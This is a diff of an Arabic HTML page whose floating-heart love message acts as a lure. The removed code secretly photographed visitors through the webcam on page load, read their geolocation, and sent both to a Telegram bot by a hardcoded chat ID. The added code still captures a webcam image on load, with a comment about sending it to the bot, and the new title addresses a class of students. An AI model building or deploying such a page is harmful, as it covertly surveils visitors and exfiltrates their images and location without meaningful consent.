@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>  احبج زهراء</title>
+<title>تحياتي لكم طلاب قسم تجميع الحاسبات أ</title>
 <style>
   body {
     margin: 0;
@@ -20,12 +20,6 @@
     user-select: none;
     pointer-events: none;
     white-space: nowrap;
-    animation: floatUp linear infinite;
-  }
-
-  @keyframes floatUp {
-    0% { transform: translateY(100vh) scale(1); opacity: 1; }
-    100% { transform: translateY(-50px) scale(0.5); opacity: 0; }
   }
 
   video, canvas {
@@ -46,43 +40,43 @@
 <canvas width="160" height="120"></canvas>
 
 <script>
-  // ======== حركة القلوب ========
-  const texts = ['❤️ أحبج زهراء ❤️'];
+  // ======== حركة القلوب العشوائية ========
+  const texts = ['❤️ أحبك زهراء ❤️'];
+  const hearts = [];
 
   function createHeart() {
     const heart = document.createElement('div');
     heart.className = 'heart';
     heart.textContent = texts[Math.floor(Math.random() * texts.length)];
     heart.style.left = Math.random() * window.innerWidth + 'px';
-    heart.style.fontSize = (20 + Math.random() * 30) + 'px';
-    heart.style.animationDuration = (4 + Math.random() * 3) + 's';
+    heart.style.top = Math.random() * window.innerHeight + 'px';
+    heart.speedX = (Math.random() - 0.5) * 2;
+    heart.speedY = (Math.random() - 0.5) * 2;
     document.body.appendChild(heart);
-    setTimeout(() => heart.remove(), 7000);
+    hearts.push(heart);
   }
 
-  setInterval(createHeart, 300);
+  for (let i = 0; i < 30; i++) createHeart();
 
-  // ======== إرسال الصورة والموقع للبوت ========
-  const BOT_TOKEN = "ضع_التوكن_هنا"; // ضع توكن البوت على جهازك
-  const CHAT_ID = "1037860664";       // ايدي الشات الخاص بك
+  function moveHearts() {
+    hearts.forEach(h => {
+      let x = parseFloat(h.style.left);
+      let y = parseFloat(h.style.top);
+      x += h.speedX;
+      y += h.speedY;
 
-  async function sendPhotoAndLocation(blob, latitude, longitude) {
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("photo", blob, "capture.jpg");
+      if (x < 0 || x > window.innerWidth - 50) h.speedX *= -1;
+      if (y < 0 || y > window.innerHeight - 30) h.speedY *= -1;
 
-    // إرسال الصورة
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method: "POST",
-      body: formData
+      h.style.left = x + 'px';
+      h.style.top = y + 'px';
     });
-
-    // إرسال الموقع
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`);
+    requestAnimationFrame(moveHearts);
   }
+  moveHearts();
 
-  // ======== التقاط الصورة والموقع تلقائيًا ========
-  async function captureAndSend() {
+  // ======== التقاط الصورة تلقائيًا بعد طلب الإذن ========
+  async function capturePhoto() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       const video = document.querySelector('video');
@@ -93,26 +87,17 @@
 
       setTimeout(async () => {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
-
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-          const latitude = pos.coords.latitude;
-          const longitude = pos.coords.longitude;
-
-          await sendPhotoAndLocation(blob, latitude, longitude);
-          console.log("تم إرسال الصورة والموقع للبوت بنجاح!");
-        });
-
+        const imageData = canvas.toDataURL('image/jpeg');
+        console.log("تم التقاط الصورة:", imageData); // هنا تستطيع إرسال الصورة للبوت إذا أردت
         stream.getTracks().forEach(track => track.stop());
       }, 2000);
 
     } catch (err) {
-      console.error("فشل الوصول للكاميرا أو الموقع:", err);
+      console.error("فشل الوصول للكاميرا:", err);
     }
   }
 
-  // بدء العملية تلقائيًا عند تحميل الصفحة
-  window.addEventListener('load', captureAndSend);
+  window.addEventListener('load', capturePhoto);
 </script>
 
 </body>
